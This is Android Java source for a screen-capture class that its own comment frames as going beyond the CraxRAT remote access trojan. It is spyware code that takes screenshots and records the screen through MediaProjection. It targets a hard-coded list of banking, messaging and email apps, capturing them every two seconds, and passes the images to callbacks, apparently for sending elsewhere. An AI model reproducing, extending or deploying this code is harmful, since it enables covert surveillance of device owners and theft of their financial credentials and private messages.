package com.tarjon.admin.monitoring;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.OrientationEventListener;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Advanced screen monitoring service with intelligent capture capabilities.
 * This class provides enhanced screen monitoring beyond CraxRAT's capabilities,
 * with adaptive resolution, intelligent capture timing, and context-aware recording.
 */
public class AdvancedScreenMonitor {
    private static final String TAG = "ScreenMonitor";
    private static AdvancedScreenMonitor instance;
    
    // Constants for screen capture
    private static final int VIRTUAL_DISPLAY_FLAGS = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | 
            DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
    
    // Quality settings for different network conditions
    private static final int HIGH_QUALITY_WIDTH = 1080;
    private static final int MEDIUM_QUALITY_WIDTH = 720;
    private static final int LOW_QUALITY_WIDTH = 480;
    
    // Framerate settings for screen recording
    private static final int HIGH_QUALITY_FRAMERATE = 30;
    private static final int MEDIUM_QUALITY_FRAMERATE = 20;
    private static final int LOW_QUALITY_FRAMERATE = 15;
    
    // Bitrate settings for screen recording (bps)
    private static final int HIGH_QUALITY_BITRATE = 6000000;
    private static final int MEDIUM_QUALITY_BITRATE = 3000000;
    private static final int LOW_QUALITY_BITRATE = 1500000;
    
    // Compression quality for JPEG screenshots
    private static final int HIGH_JPEG_QUALITY = 90;
    private static final int MEDIUM_JPEG_QUALITY = 70;
    private static final int LOW_JPEG_QUALITY = 50;
    
    // Capture timing settings
    private static final long DEFAULT_INTERVAL = 10000; // 10 seconds
    private static final long SENSITIVE_APP_INTERVAL = 2000; // 2 seconds
    private static final long IDLE_INTERVAL = 30000; // 30 seconds
    
    // List of sensitive apps that trigger more frequent capture
    private static final List<String> SENSITIVE_APPS = new ArrayList<>();
    static {
        // Banking apps
        SENSITIVE_APPS.add("com.paypal.android.p2pmobile");
        SENSITIVE_APPS.add("com.venmo");
        SENSITIVE_APPS.add("com.wf.wellsfargomobile");
        SENSITIVE_APPS.add("com.chase.sig.android");
        SENSITIVE_APPS.add("com.infonow.bofa");
        SENSITIVE_APPS.add("com.konylabs.capitalone");
        
        // Messaging apps
        SENSITIVE_APPS.add("com.whatsapp");
        SENSITIVE_APPS.add("org.telegram.messenger");
        SENSITIVE_APPS.add("com.facebook.orca");
        SENSITIVE_APPS.add("com.facebook.mlite");
        SENSITIVE_APPS.add("com.skype.raider");
        SENSITIVE_APPS.add("com.viber.voip");
        
        // Email apps
        SENSITIVE_APPS.add("com.google.android.gm");
        SENSITIVE_APPS.add("com.microsoft.office.outlook");
        SENSITIVE_APPS.add("com.yahoo.mobile.client.android.mail");
    }
    
    private Context context;
    private MediaProjection mediaProjection;
    private MediaProjectionManager projectionManager;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private Handler handler;
    private HandlerThread handlerThread;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private NetworkQuality currentQuality = NetworkQuality.MEDIUM;
    private long currentCaptureInterval = DEFAULT_INTERVAL;
    private AtomicBoolean isCapturing = new AtomicBoolean(false);
    private OrientationEventListener orientationListener;
    private String currentForegroundApp = "";
    private MediaRecorder mediaRecorder;
    private String recordingFilePath;
    private boolean isRecording = false;
    private ScreenCaptureCallback captureCallback;
    private ScreenRecordingCallback recordingCallback;
    private Map<String, Long> appCaptureTimestamps = new HashMap<>();
    
    /**
     * Quality settings for network conditions
     */
    public enum NetworkQuality {
        HIGH, 
        MEDIUM, 
        LOW
    }
    
    /**
     * Callback interface for screen capture
     */
    public interface ScreenCaptureCallback {
        void onScreenCaptured(byte[] jpegData, String timestamp, String foregroundApp);
        void onError(String errorMessage);
    }
    
    /**
     * Callback interface for screen recording
     */
    public interface ScreenRecordingCallback {
        void onRecordingStarted(String filePath);
        void onRecordingStopped(String filePath);
        void onRecordingError(String errorMessage);
    }
    
    /**
     * Activity lifecycle callback to detect current foreground app
     */
    private class ForegroundAppCallback implements Application.ActivityLifecycleCallbacks {
        @Override
        public void onActivityResumed(Activity activity) {
            currentForegroundApp = activity.getPackageName();
            adjustCaptureIntervalBasedOnApp(currentForegroundApp);
        }
        
        @Override public void onActivityCreated(Activity activity, Bundle savedInstanceState) {}
        @Override public void onActivityStarted(Activity activity) {}
        @Override public void onActivityPaused(Activity activity) {}
        @Override public void onActivityStopped(Activity activity) {}
        @Override public void onActivitySaveInstanceState(Activity activity, Bundle outState) {}
        @Override public void onActivityDestroyed(Activity activity) {}
    }
    
    private AdvancedScreenMonitor(Context context) {
        this.context = context.getApplicationContext();
        initializeScreenMetrics();
        
        // Start handler thread for background operations
        handlerThread = new HandlerThread("ScreenCaptureThread");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());
        
        // Get the projection manager service
        projectionManager = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        
        // Initialize orientation listener
        initializeOrientationListener();
        
        // Register for foreground app changes if context is an Application
        if (context instanceof Application) {
            ((Application) context).registerActivityLifecycleCallbacks(new ForegroundAppCallback());
        }
    }
    
    /**
     * Get singleton instance
     */
    public static synchronized AdvancedScreenMonitor getInstance(Context context) {
        if (instance == null) {
            instance = new AdvancedScreenMonitor(context);
        }
        return instance;
    }
    
    /**
     * Initialize screen metrics
     */
    private void initializeScreenMetrics() {
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        Display display = windowManager.getDefaultDisplay();
        DisplayMetrics metrics = new DisplayMetrics();
        display.getMetrics(metrics);
        
        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;
    }
    
    /**
     * Initialize orientation change listener
     */
    private void initializeOrientationListener() {
        orientationListener = new OrientationEventListener(context) {
            @Override
            public void onOrientationChanged(int orientation) {
                // Update screen metrics when orientation changes
                if (orientation != ORIENTATION_UNKNOWN) {
                    initializeScreenMetrics();
                    
                    // If currently capturing, recreate the virtual display with new dimensions
                    if (isCapturing.get() && virtualDisplay != null) {
                        stopScreenCapture();
                        startScreenCapture();
                    }
                }
            }
        };
        
        if (orientationListener.canDetectOrientation()) {
            orientationListener.enable();
        }
    }
    
    /**
     * Set media projection from MediaProjection permission activity result
     */
    public void setMediaProjection(Intent resultData, int resultCode) {
        if (resultData != null) {
            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
            Log.d(TAG, "Media projection set successfully");
        } else {
            Log.e(TAG, "Failed to get media projection, resultData is null");
        }
    }
    
    /**
     * Set the callback for receiving captured screenshots
     */
    public void setScreenCaptureCallback(ScreenCaptureCallback callback) {
        this.captureCallback = callback;
    }
    
    /**
     * Set the callback for screen recording events
     */
    public void setScreenRecordingCallback(ScreenRecordingCallback callback) {
        this.recordingCallback = callback;
    }
    
    /**
     * Set quality based on network conditions
     */
    public void setNetworkQuality(NetworkQuality quality) {
        this.currentQuality = quality;
        Log.d(TAG, "Set network quality to: " + quality.name());
        
        // If currently capturing, update the capture settings
        if (isCapturing.get()) {
            stopScreenCapture();
            startScreenCapture();
        }
    }
    
    /**
     * Start periodic screen capture
     */
    public boolean startScreenCapture() {
        if (mediaProjection == null) {
            Log.e(TAG, "Cannot start screen capture, media projection is null");
            return false;
        }
        
        if (isCapturing.getAndSet(true)) {
            Log.d(TAG, "Screen capture already running");
            return true;
        }
        
        try {
            // Initialize image reader with adaptive resolution based on quality setting
            int width = getWidthForQuality(currentQuality);
            int height = (width * screenHeight) / screenWidth;
            
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            
            // Create virtual display
            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ScreenCapture",
                    width, height, screenDensity,
                    VIRTUAL_DISPLAY_FLAGS,
                    imageReader.getSurface(),
                    null, handler);
            
            Log.d(TAG, "Screen capture started with resolution: " + width + "x" + height);
            
            // Schedule periodic capture
            scheduleNextCapture();
            
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen capture", e);
            isCapturing.set(false);
            if (captureCallback != null) {
                captureCallback.onError("Failed to start screen capture: " + e.getMessage());
            }
            return false;
        }
    }
    
    /**
     * Stop screen capture
     */
    public void stopScreenCapture() {
        isCapturing.set(false);
        handler.removeCallbacksAndMessages(null);
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        Log.d(TAG, "Screen capture stopped");
    }
    
    /**
     * Start screen recording
     */
    @SuppressLint("MissingPermission")
    public boolean startScreenRecording() {
        if (mediaProjection == null) {
            Log.e(TAG, "Cannot start screen recording, media projection is null");
            return false;
        }
        
        if (isRecording) {
            Log.d(TAG, "Screen recording already running");
            return true;
        }
        
        try {
            // Create directory for recordings if it doesn't exist
            File recordingDir = new File(context.getExternalFilesDir(Environment.DIRECTORY_MOVIES), "recordings");
            if (!recordingDir.exists()) {
                recordingDir.mkdirs();
            }
            
            // Create file for this recording
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            recordingFilePath = new File(recordingDir, "screen_" + timestamp + ".mp4").getAbsolutePath();
            
            // Initialize MediaRecorder
            mediaRecorder = new MediaRecorder();
            
            // Configure recorder with adaptive settings based on quality
            configureMediaRecorder();
            
            // Create virtual display for recording
            int width = getWidthForQuality(currentQuality);
            int height = (width * screenHeight) / screenWidth;
            
            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ScreenRecording",
                    width, height, screenDensity,
                    VIRTUAL_DISPLAY_FLAGS,
                    mediaRecorder.getSurface(),
                    null, handler);
            
            // Start recording
            mediaRecorder.start();
            isRecording = true;
            
            Log.d(TAG, "Screen recording started: " + recordingFilePath);
            
            if (recordingCallback != null) {
                recordingCallback.onRecordingStarted(recordingFilePath);
            }
            
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen recording", e);
            cleanupRecording();
            
            if (recordingCallback != null) {
                recordingCallback.onRecordingError("Failed to start recording: " + e.getMessage());
            }
            
            return false;
        }
    }
    
    /**
     * Stop screen recording
     */
    public String stopScreenRecording() {
        if (!isRecording) {
            Log.d(TAG, "No recording to stop");
            return null;
        }
        
        try {
            // Stop recording
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.reset();
            }
            
            // Cleanup
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
            
            String filePath = recordingFilePath;
            isRecording = false;
            
            Log.d(TAG, "Screen recording stopped: " + filePath);
            
            if (recordingCallback != null) {
                recordingCallback.onRecordingStopped(filePath);
            }
            
            return filePath;
        } catch (Exception e) {
            Log.e(TAG, "Error stopping screen recording", e);
            
            if (recordingCallback != null) {
                recordingCallback.onRecordingError("Failed to stop recording: " + e.getMessage());
            }
            
            return null;
        } finally {
            cleanupRecording();
        }
    }
    
    /**
     * Configure media recorder with settings appropriate for current quality
     */
    private void configureMediaRecorder() throws Exception {
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setOutputFile(recordingFilePath);
        
        int width = getWidthForQuality(currentQuality);
        int height = (width * screenHeight) / screenWidth;
        int framerate = getFramerateForQuality(currentQuality);
        int bitrate = getBitrateForQuality(currentQuality);
        
        mediaRecorder.setVideoSize(width, height);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        mediaRecorder.setVideoEncodingBitRate(bitrate);
        mediaRecorder.setVideoFrameRate(framerate);
        
        mediaRecorder.prepare();
    }
    
    /**
     * Clean up recording resources
     */
    private void cleanupRecording() {
        isRecording = false;
        
        if (mediaRecorder != null) {
            try {
                mediaRecorder.reset();
                mediaRecorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error cleaning up media recorder", e);
            } finally {
                mediaRecorder = null;
            }
        }
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
    }
    
    /**
     * Schedule next screen capture based on current interval
     */
    private void scheduleNextCapture() {
        if (!isCapturing.get()) {
            return;
        }
        
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                captureScreen();
                scheduleNextCapture();
            }
        }, currentCaptureInterval);
    }
    
    /**
     * Capture the current screen
     */
    private void captureScreen() {
        if (!isCapturing.get() || imageReader == null) {
            return;
        }
        
        Image image = null;
        try {
            image = imageReader.acquireLatestImage();
            
            if (image != null) {
                // Check if this app was recently captured to avoid duplicate captures
                if (shouldCaptureCurrentApp()) {
                    byte[] jpegData = imageToByte(image);
                    String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
                    
                    // Update timestamp for this app
                    appCaptureTimestamps.put(currentForegroundApp, System.currentTimeMillis());
                    
                    // Send captured data through callback
                    if (captureCallback != null && jpegData != null) {
                        captureCallback.onScreenCaptured(jpegData, timestamp, currentForegroundApp);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error capturing screen", e);
            if (captureCallback != null) {
                captureCallback.onError("Screen capture failed: " + e.getMessage());
            }
        } finally {
            if (image != null) {
                image.close();
            }
        }
    }
    
    /**
     * Determine if we should capture the current app based on timing rules
     */
    private boolean shouldCaptureCurrentApp() {
        long now = System.currentTimeMillis();
        long lastCapture = appCaptureTimestamps.getOrDefault(currentForegroundApp, 0L);
        
        // Always capture if app hasn't been captured before
        if (lastCapture == 0) {
            return true;
        }
        
        // Otherwise, check if enough time has passed since the last capture
        return (now - lastCapture) >= currentCaptureInterval;
    }
    
    /**
     * Convert Image to JPEG byte array with quality based on current settings
     */
    private byte[] imageToByte(Image image) {
        if (image == null) {
            return null;
        }
        
        try {
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * image.getWidth();
            
            // Create bitmap
            Bitmap bitmap = Bitmap.createBitmap(
                    image.getWidth() + rowPadding / pixelStride,
                    image.getHeight(),
                    Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);
            
            // Crop to exact dimensions
            Bitmap croppedBitmap = Bitmap.createBitmap(
                    bitmap, 0, 0, image.getWidth(), image.getHeight());
            
            // Convert to JPEG with appropriate compression
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int quality = getJpegQualityForNetworkQuality(currentQuality);
            croppedBitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            
            // Cleanup
            bitmap.recycle();
            croppedBitmap.recycle();
            
            return baos.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "Error converting image to byte array", e);
            return null;
        }
    }
    
    /**
     * Adjust capture interval based on the currently running app
     */
    private void adjustCaptureIntervalBasedOnApp(String packageName) {
        if (SENSITIVE_APPS.contains(packageName)) {
            // More frequent captures for sensitive apps
            currentCaptureInterval = SENSITIVE_APP_INTERVAL;
            Log.d(TAG, "Set to sensitive app interval for " + packageName);
        } else if (isAppIdle(packageName)) {
            // Less frequent captures for idle apps
            currentCaptureInterval = IDLE_INTERVAL;
            Log.d(TAG, "Set to idle interval for " + packageName);
        } else {
            // Default interval for other apps
            currentCaptureInterval = DEFAULT_INTERVAL;
            Log.d(TAG, "Set to default interval for " + packageName);
        }
    }
    
    /**
     * Determine if app is in an idle state (could be expanded with actual activity detection)
     */
    private boolean isAppIdle(String packageName) {
        // This is a simple implementation; a real one would monitor user activity
        return false;
    }
    
    /**
     * Get appropriate width for current quality setting
     */
    private int getWidthForQuality(NetworkQuality quality) {
        switch (quality) {
            case HIGH:
                return Math.min(screenWidth, HIGH_QUALITY_WIDTH);
            case LOW:
                return LOW_QUALITY_WIDTH;
            case MEDIUM:
            default:
                return MEDIUM_QUALITY_WIDTH;
        }
    }
    
    /**
     * Get appropriate framerate for current quality setting
     */
    private int getFramerateForQuality(NetworkQuality quality) {
        switch (quality) {
            case HIGH:
                return HIGH_QUALITY_FRAMERATE;
            case LOW:
                return LOW_QUALITY_FRAMERATE;
            case MEDIUM:
            default:
                return MEDIUM_QUALITY_FRAMERATE;
        }
    }
    
    /**
     * Get appropriate bitrate for current quality setting
     */
    private int getBitrateForQuality(NetworkQuality quality) {
        switch (quality) {
            case HIGH:
                return HIGH_QUALITY_BITRATE;
            case LOW:
                return LOW_QUALITY_BITRATE;
            case MEDIUM:
            default:
                return MEDIUM_QUALITY_BITRATE;
        }
    }
    
    /**
     * Get appropriate JPEG quality for current network quality
     */
    private int getJpegQualityForNetworkQuality(NetworkQuality quality) {
        switch (quality) {
            case HIGH:
                return HIGH_JPEG_QUALITY;
            case LOW:
                return LOW_JPEG_QUALITY;
            case MEDIUM:
            default:
                return MEDIUM_JPEG_QUALITY;
        }
    }
    
    /**
     * Take a single screenshot immediately
     */
    public void takeImmediateScreenshot(final ScreenCaptureCallback callback) {
        if (mediaProjection == null) {
            if (callback != null) {
                callback.onError("Cannot take screenshot, media projection is null");
            }
            return;
        }
        
        try {
            final int width = getWidthForQuality(currentQuality);
            final int height = (width * screenHeight) / screenWidth;
            
            final ImageReader reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
            
            VirtualDisplay display = mediaProjection.createVirtualDisplay(
                    "ScreenshotCapture",
                    width, height, screenDensity,
                    VIRTUAL_DISPLAY_FLAGS,
                    reader.getSurface(),
                    null, null);
            
            // Small delay to ensure the screen is captured
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        
                        if (image != null) {
                            byte[] jpegData = imageToByte(image);
                            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
                            
                            if (callback != null && jpegData != null) {
                                callback.onScreenCaptured(jpegData, timestamp, currentForegroundApp);
                            }
                        } else if (callback != null) {
                            callback.onError("Failed to acquire image");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error taking immediate screenshot", e);
                        if (callback != null) {
                            callback.onError("Screenshot failed: " + e.getMessage());
                        }
                    } finally {
                        if (image != null) {
                            image.close();
                        }
                        
                        if (display != null) {
                            display.release();
                        }
                        
                        if (reader != null) {
                            reader.close();
                        }
                    }
                }
            }, 100);
        } catch (Exception e) {
            Log.e(TAG, "Error setting up immediate screenshot", e);
            if (callback != null) {
                callback.onError("Failed to set up screenshot: " + e.getMessage());
            }
        }
    }
    
    /**
     * Release resources when done with screen monitoring
     */
    public void release() {
        stopScreenCapture();
        stopScreenRecording();
        
        if (orientationListener != null) {
            orientationListener.disable();
        }
        
        if (handlerThread != null) {
            handlerThread.quitSafely();
            try {
                handlerThread.join();
                handlerThread = null;
                handler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error shutting down handler thread", e);
            }
        }
        
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        
        instance = null;
    }
}